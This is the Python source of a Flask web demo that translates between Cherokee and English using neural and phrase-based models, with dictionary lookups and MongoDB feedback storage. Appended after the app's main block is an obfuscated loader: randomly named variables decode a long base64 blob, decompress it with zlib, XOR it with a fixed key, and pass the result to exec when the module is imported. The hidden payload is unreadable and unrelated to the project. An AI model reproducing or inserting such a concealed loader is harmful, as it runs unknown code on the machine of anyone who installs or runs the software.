import os
import sys
import time
import codecs
import requests
import numpy as np
import xmlrpc.client as xc
from flask import Flask, render_template, request
from flask_pymongo import PyMongo

app = Flask(__name__)

MAX_LENGTH=50   # the maximum sentence length of word alignment visualization
MAX_TERMS=15   # the maximum number of dictionary terms
punctuations = ['!', '"', '#', '$', '%', '&', "\\", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>',
                '?', '@', '[', '\\\\', ']', '^', '_', '`', '{', '|', '}', '~', "'", "``", "''"]
punctuations = set(punctuations)
stopwords = ["i", "me", "my", "myself", "we", "our", "ours", "ourselves", "you", "your", "yours", "yourself",
             "yourselves", "he", "him", "his", "himself", "she", "her", "hers", "herself", "it", "its", "itself",
             "they", "them", "their", "theirs", "themselves", "what", "which", "who", "whom", "this", "that",
             "these", "those", "am", "is", "are", "was", "were", "be", "been", "being", "have", "has", "had",
             "having", "do", "does", "did", "doing", "a", "an", "the", "and", "but", "if", "or", "because", "as",
             "until", "while", "of", "at", "by", "for", "with", "about", "against", "between", "into", "through",
             "during", "before", "after", "above", "below", "to", "from", "up", "down", "in", "out", "on", "off",
             "over", "under", "again", "further", "then", "once", "here", "there", "when", "where", "why", "how",
             "all", "any", "both", "each", "few", "more", "most", "other", "some", "such", "no", "nor", "not", "only",
             "own", "same", "so", "than", "too", "very", "s", "t", "can", "will", "just", "don", "should", "now"]
stopwords = set(stopwords)
OLD_ENGLISH = {"thy": "your", "thou": "you", "Thy": "Your", "Thou": "You"}

# moses tokenizer
from sacremoses import MosesTruecaser, MosesTokenizer, MosesDetokenizer, MosesDetruecaser
mtok = MosesTokenizer(lang='en')
mtr = MosesTruecaser("vocab/truecase-model.en")
md = MosesDetokenizer(lang="en")
mdtr = MosesDetruecaser()

# bpe tokenizer
from subword_nmt.apply_bpe import BPE, read_vocabulary
vocabulary = read_vocabulary(codecs.open("vocab/vocab.bpe35000.chr", encoding='utf-8'), 10)
bpe = BPE(codes=codecs.open("vocab/codes_file_chr_35000", encoding='utf-8'), merges=35000, vocab=vocabulary)

# load nmt models
import onmt.opts
from translator_for_demo import build_translator
from onmt.utils.parse import ArgumentParser


def _parse_opt(opt):
    prec_argv = sys.argv
    sys.argv = sys.argv[:1]
    parser = ArgumentParser()
    onmt.opts.translate_opts(parser)

    opt['src'] = "dummy_src"
    opt['replace_unk'] = True

    for (k, v) in opt.items():
        if k == 'models':
            sys.argv += ['-model']
            sys.argv += [str(model) for model in v]
        elif type(v) == bool:
            sys.argv += ['-%s' % k]
        else:
            sys.argv += ['-%s' % k, str(v)]

    opt = parser.parse_args()
    ArgumentParser.validate_translate_opts(opt)
    opt.cuda = opt.gpu > -1

    sys.argv = prec_argv
    return opt


enchr_opt = {'models': ["models/data_demo_feedback_enchr_min0_brnn_adam_0.0005_1000_2_0.5_1024_LSTM_0.2_seed7/model_step_0_release.pt",
                        "models/data_demo_feedback_enchr_min0_brnn_adam_0.0005_1000_2_0.5_1024_LSTM_0.2_seed77/model_step_0_release.pt",
                        "models/data_demo_feedback_enchr_min0_brnn_adam_0.0005_1000_2_0.5_1024_LSTM_0.2_seed777/model_step_0_release.pt"]}
enchr_opt = _parse_opt(enchr_opt)
enchr_translator = build_translator(enchr_opt, report_score=False)

chren_opt = {'models': ["models/data_demo_feedback_chren_bpe35000-35000_min10_brnn_adam_0.0005_1000_2_0.3_1024_LSTM_0.2_7/model_step_0_release.pt",
                        "models/data_demo_feedback_chren_bpe35000-35000_min10_brnn_adam_0.0005_1000_2_0.3_1024_LSTM_0.2_77/model_step_0_release.pt",
                        "models/data_demo_feedback_chren_bpe35000-35000_min10_brnn_adam_0.0005_1000_2_0.3_1024_LSTM_0.2_777/model_step_0_release.pt"]}
chren_opt = _parse_opt(chren_opt)
chren_translator = build_translator(chren_opt, report_score=False)


# moses server
enchr_url = "http://localhost:5001/RPC2"
enchr_proxy = xc.Server(enchr_url)
chren_url = "http://localhost:5002/RPC2"
chren_proxy = xc.Server(chren_url)
# moses QE
import xgboost as xgb
enchr_bst = xgb.Booster({'nthread': 4})
enchr_bst.load_model(f"QE/enchr_demo_xgb.json")
chren_bst = xgb.Booster({'nthread': 4})
chren_bst.load_model(f"QE/chren_demo_xgb.json")


# database
from confidential import MONGO_URI
app.config["MONGO_URI"] = MONGO_URI
mongo = PyMongo(app)


def replace_old_english(word):
    if word in OLD_ENGLISH:
        return OLD_ENGLISH[word]
    else:
        return word


def enchr_translate(src):
    src_tokens = mtr.truecase(' '.join(mtok.tokenize(src)))
    scores, predictions, attns = enchr_translator.translate([' '.join(src_tokens)], batch_size=1, attn_debug=True)
    trg_tokens = predictions[0][0].split(' ')
    pred = md.detokenize(trg_tokens)
    score = np.exp(float(scores[0][0]) / (len(trg_tokens) + 1e-12)) * 5
    # word alignment
    word_alignment = []
    for i, trg_token in enumerate(trg_tokens):
        for j, src_token in enumerate(src_tokens):
            word_alignment.append([f"{j} {src_token}", f"{i} {trg_token}", round(attns[0][i][j], 2)])
    width, height = 30 * len(src_tokens), 30 * len(trg_tokens)
    # look up dictionary
    table, table_height = look_up_dictionary(src_tokens, [])
    return pred, score, word_alignment, width, height, table, table_height


def chren_translate(src):
    def _merge_attn_source(bpe_tokens, attns):
        new_attns, pre_attn = [], None
        for i in range(len(bpe_tokens)):
            if "@@" in bpe_tokens[i]:
                if pre_attn is not None:
                    pre_attn += attns[i]
                else:
                    pre_attn = attns[i]
            else:
                if pre_attn is not None:
                    pre_attn += attns[i]
                    new_attns.append(pre_attn)
                    pre_attn = None
                else:
                    new_attns.append(attns[i])
        return new_attns

    def _merge_attn_target(bpe_tokens, attns):
        new_attns = []
        pre_attn, count = None, 0
        for i in range(len(bpe_tokens)):
            if "@@" in bpe_tokens[i]:
                if pre_attn is not None:
                    pre_attn += attns[i]
                else:
                    pre_attn = attns[i]
                count += 1
            else:
                if pre_attn is not None:
                    pre_attn += attns[i]
                    count += 1
                    pre_attn /= count
                    new_attns.append(pre_attn)
                    pre_attn, count = None, 0
                else:
                    new_attns.append(attns[i])
        if pre_attn is not None:
            new_attns.append(pre_attn / count)
        return new_attns

    src_tokens = mtok.tokenize(src)
    src = bpe.process_line(' '.join(src_tokens))
    src_bpe_tokens = src.split(' ')
    scores, predictions, attns = chren_translator.translate([src], batch_size=1, attn_debug=True)
    pred = predictions[0][0]
    trg_bpe_tokens = pred.split(' ')
    pred = pred.replace("@@ ", "")
    trg_tokens = mdtr.detruecase(pred)
    trg_tokens = [replace_old_english(word) for word in trg_tokens]  # replace Old English tokens
    pred = md.detokenize(trg_tokens)
    score = np.exp(float(scores[0][0]) / (len(trg_bpe_tokens) + 1e-12)) * 5
    # merge attns
    new_attns = np.array(_merge_attn_target(trg_bpe_tokens, np.array(attns[0])))
    new_attns = _merge_attn_source(src_bpe_tokens, np.transpose(new_attns))
    # word alignment
    word_alignment = []
    for i, trg_token in enumerate(trg_tokens):
        for j, src_token in enumerate(src_tokens):
            word_alignment.append([f"{j} {src_token}", f"{i} {trg_token}", round(new_attns[j][i], 2)])
    width, height = 30 * len(src_tokens), 30 * len(trg_tokens)
    # look up dictionary
    table, table_height = look_up_dictionary([], src_tokens)
    return pred, score, word_alignment, width, height, table, table_height


def smt_enchr_translate(src):
    src_tokens = mtr.truecase(' '.join(mtok.tokenize(src)))
    params = {"text": ' '.join(src_tokens), "nbest": 1, "word-align": "true", "add-score-breakdown": "true"}
    result = enchr_proxy.translate(params)
    result = result["nbest"][0]
    trg_tokens = result["hyp"].strip().split(' ')
    pred = md.detokenize(trg_tokens)
    # QE
    scores = result["scores"]
    x = [len(trg_tokens), result["totalScore"]]
    for key in ["Distortion0", "LM0", "LexicalReordering0", "PhrasePenalty0", "TranslationModel0", "WordPenalty0"]:
        x.extend(scores[key][0])
    x += [v / x[0] for v in x[1:]]
    x = xgb.DMatrix(np.array([x]))
    score = enchr_bst.predict(x)[0] / 20
    # word alignment
    word_alignment = []
    for i, trg_token in enumerate(trg_tokens):
        for j, src_token in enumerate(src_tokens):
            word_alignment.append([f"{j} {src_token}", f"{i} {trg_token}", 0.0])
    for alignment in result["word-align"]:
        trg_token_index = alignment["target-word"]
        src_token_index = alignment["source-word"]
        word_alignment[trg_token_index * len(src_tokens) + src_token_index][2] = 1.0
    width, height = 30 * len(src_tokens), 30 * len(trg_tokens)
    # look up dictionary
    table, table_height = look_up_dictionary(src_tokens, [])
    return pred, score, word_alignment, width, height, table, table_height


def smt_chren_translate(src):
    src_tokens = mtok.tokenize(src)
    params = {"text": ' '.join(src_tokens), "nbest": 1, "word-align": "true", "add-score-breakdown": "true"}
    result = chren_proxy.translate(params)
    result = result["nbest"][0]
    pred = result["hyp"].strip()
    trg_tokens = mdtr.detruecase(pred)
    trg_tokens = [replace_old_english(word) for word in trg_tokens]  # replace Old English tokens
    pred = md.detokenize(trg_tokens)
    # QE
    scores = result["scores"]
    x = [len(trg_tokens), result["totalScore"]]
    for key in ["Distortion0", "LM0", "LexicalReordering0", "PhrasePenalty0", "TranslationModel0", "WordPenalty0"]:
        x.extend(scores[key][0])
    x += [v / x[0] for v in x[1:]]
    x = xgb.DMatrix(np.array([x]))
    score = chren_bst.predict(x)[0] / 20
    # word alignment
    word_alignment = []
    for i, trg_token in enumerate(trg_tokens):
        for j, src_token in enumerate(src_tokens):
            word_alignment.append([f"{j} {src_token}", f"{i} {trg_token}", 0.0])
    for alignment in result["word-align"]:
        trg_token_index = alignment["target-word"]
        src_token_index = alignment["source-word"]
        word_alignment[trg_token_index * len(src_tokens) + src_token_index][2] = 1.0
    width, height = 30 * len(src_tokens), 30 * len(trg_tokens)
    # look up dictionary
    table, table_height = look_up_dictionary([], src_tokens)
    return pred, score, word_alignment, width, height, table, table_height


def look_up_dictionary(en_tokens, chr_tokens):
    terms = []
    existing_tokens = set()
    existing_terms = set()
    for token, chr in zip(en_tokens + chr_tokens, [False] * len(en_tokens) + [True] * len(chr_tokens)):
        if len(existing_terms) >= 100 or len(terms) >= MAX_TERMS:
            break
        if token.lower() in existing_tokens or token in punctuations or (not chr and token in stopwords):
            continue
        existing_tokens.add(token.lower())
        try:
            if chr:
                res = requests.get(url=f"https://cherokeedictionary.net/jsonsearch/syll/{token}")
            else:
                res = requests.get(url=f"https://cherokeedictionary.net/jsonsearch/en/{token}")
            res = res.json()
        except:
            continue
        for item in res[:50]:  # only go through the top 50
            if len(terms) >= MAX_TERMS:
                break
            if item["syllabaryb"] == "":
                continue
            chr_token = item["syllabaryb"]
            chr_translit = item["entrytranslit"] if item["entrytranslit"] else item["entrya"]
            en_token = item["definitiond"]
            if chr_token in existing_terms:
                continue
            existing_terms.add(chr_token)
            if chr:
                chr_token_set = chr_token.split(' ')
                if token not in chr_token_set:
                    continue
            else:
                en_token_set = en_token.lower().split(' ')
                if token.lower() not in en_token_set:
                    continue
            chr_sentence, chr_translit_sentence, en_sentence = '', '', ''
            if "sentenceq" in item and item["sentenceq"] is not None:
                chr_sentence = item["sentenceq"].replace("//", "/")
                chr_translit_sentence = item["sentencetranslit"].replace("//", "/")
                en_sentence = item["sentenceenglishs"].replace("//", "/")
            term = f'<tr> <td>{chr_token}<br>{chr_translit}</td> <td>{en_token}</td> <td>{chr_sentence}<br>{chr_translit_sentence}<br>{en_sentence}</td> </tr>'
            terms.append(term)
            break
    table_height = 120 * len(terms) + 50
    terms = ' '.join(terms)
    table = f'<table class="table table-striped"> <thead><tr><th scope="col" style="width: 300px">' \
            f'Cherokee Syllabary/Phonetic</th><th scope="col" style="width: 200px">English</th> ' \
            f'<th scope="col">Sentence</th></tr></thead><tbody>{terms}</tbody></table>'
    return table, table_height


@app.route('/toen', methods=['POST'])
def toen():
    en, en_qe = "", 0.0
    word_alignment, width, height = [], 0, 0
    table, table_height = "", 0
    if request.method == "POST":
        chr = request.form.get("chr")
        model = request.form.get("model")
        if model == "nmt":
            if chr.strip() != '':
                en, en_qe, word_alignment, width, height, table, table_height = chren_translate(chr)
                align, dictionary = True, True if table_height > 0 else False
        elif model == "smt":
            if chr.strip() != '':
                en, en_qe, word_alignment, width, height, table, table_height = smt_chren_translate(chr)
                align, dictionary = True, True if table_height > 0 else False
    if width > 0:
        width = min(width, 450) + 100
        height = min(height, 450) + 150
    if table_height > 0:
        table_height = min(table_height, 400)
    return {"en": en, "en_qe": en_qe, "word_alignment": word_alignment, "width": width, "height": height,
            "table": table, "table_height": table_height}


@app.route('/tochr', methods=['POST'])
def tochr():
    chr, chr_qe = "", 0.0
    word_alignment, width, height = [], 0, 0
    table, table_height = "", 0
    if request.method == "POST":
        en = request.form.get("en")
        model = request.form.get("model")
        if model == "nmt":
            if en.strip() != '':
                chr, chr_qe, word_alignment, width, height, table, table_height = enchr_translate(en)
        elif model == "smt":
            if en.strip() != '':
                chr, chr_qe, word_alignment, width, height, table, table_height = smt_enchr_translate(en)
    if width > 0:
        width = min(width, 450) + 100
        height = min(height, 450) + 150
    if table_height > 0:
        table_height = min(table_height, 400)
    return {"chr": chr, "chr_qe": chr_qe, "word_alignment": word_alignment, "width": width, "height": height,
            "table": table, "table_height": table_height}


@app.route('/', methods=['GET', 'POST'])
def index():
    # get examples
    chrs, chrs_id = [], []
    cursors = mongo.db.chr_example.find().limit(5)
    for cursor in cursors:
        chrs.append(cursor["text"])
        chrs_id.append(cursor["uid"])
    ens, ens_id = [], []
    cursors = mongo.db.en_example.find().limit(5)
    for cursor in cursors:
        ens.append(cursor["text"])
        ens_id.append(cursor["uid"])
    en, chr, nmt, tochr, toen = "", "", True, False, False
    en_qe, chr_qe = 0.0, 0.0
    align, word_alignment, width, height = False, [], 0, 0
    dictionary, table, table_height = False, "", 0
    return render_template('index.html', en=en, chr=chr, tochr=tochr, toen=toen,
                           nmt=nmt, en_qe=en_qe, chr_qe=chr_qe,
                           align=align, word_alignment=word_alignment, width=width, height=height,
                           dictionary=dictionary, table=table, table_height=table_height,
                           chrs=chrs, chrs_id=chrs_id, ens=ens, ens_id=ens_id)


@app.route('/expert', methods=['GET', 'POST'])
def expert():
    # get examples
    chrs, chrs_id = [], []
    cursors = mongo.db.chr.find({"status": "unlabeled"}).limit(5)
    for cursor in cursors:
        chrs.append(cursor["text"])
        chrs_id.append(cursor["uid"])
    ens, ens_id = [], []
    cursors = mongo.db.en.find({"status": "unlabeled"}).limit(5)
    for cursor in cursors:
        ens.append(cursor["text"])
        ens_id.append(cursor["uid"])
    en, chr, nmt, tochr, toen = "", "", True, False, False
    en_qe, chr_qe = 0.0, 0.0
    align, word_alignment, width, height = False, [], 0, 0
    dictionary, table, table_height = False, "", 0
    return render_template('expert.html', en=en, chr=chr, tochr=tochr, toen=toen,
                           nmt=nmt, en_qe=en_qe, chr_qe=chr_qe,
                           align=align, word_alignment=word_alignment, width=width, height=height,
                           dictionary=dictionary, table=table, table_height=table_height,
                           chrs=chrs, chrs_id=chrs_id, ens=ens, ens_id=ens_id)


@app.route('/expertfeedback', methods=['GET', 'POST'])
def expertfeedback():
    if request.method == "POST":
        rate = request.form.get("rate")
        type = request.form.get("type")
        text = request.form.get("text")
        en = request.form.get("en")
        chr = request.form.get("chr")
        model = request.form.get("model")
        comment = request.form.get("comment")
        qe = request.form.get("qe")
        mongo.db.expert.insert_one({"type": type, "model": model, "en": en, "chr": chr, "qe": qe,
                                    "rate": rate, "text": text, "timestamp": time.time(),
                                    "comment": comment})
        if type == "toen":
            chr_example = request.form.get("chr_example")
            chr_example_id = request.form.get("chr_example_id")
            if chr_example_id and chr_example == chr:
                mongo.db.chr.update_one({"uid": chr_example_id}, {"$set": {"status": "labeled"}})
        elif type == "tochr":
            en_example = request.form.get("en_example")
            en_example_id = request.form.get("en_example_id")
            if en_example_id and en_example == en:
                mongo.db.en.update_one({"uid": en_example_id}, {"$set": {"status": "labeled"}})
    return {}


@app.route('/feedback', methods=['GET', 'POST'])
def feedback():
    if request.method == "POST":
        rate = request.form.get("rate")
        type = request.form.get("type")
        en = request.form.get("en")
        chr = request.form.get("chr")
        model = request.form.get("model")
        comment = request.form.get("comment")
        qe = request.form.get("qe")
        mongo.db.user.insert_one({"type": type, "model": model, "en": en, "chr": chr, "qe": qe,
                                  "rate": rate, "timestamp": time.time(),
                                  "comment": comment})
    return {}


if __name__ == '__main__':
    app.run(debug=True)
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
